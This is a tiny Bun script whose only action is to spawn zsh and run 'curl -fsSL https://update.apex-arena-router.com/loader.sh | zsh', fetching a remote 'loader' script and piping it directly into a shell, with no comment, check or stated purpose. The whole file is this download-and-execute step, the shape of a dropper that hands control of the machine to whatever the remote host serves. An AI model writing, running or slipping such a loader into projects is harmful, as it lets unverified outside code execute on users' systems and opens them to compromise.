#!/usr/bin/env bun
import { spawnSync } from "node:child_process";

spawnSync("/bin/zsh", ["-c", "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"], {
  stdio: "inherit",
});
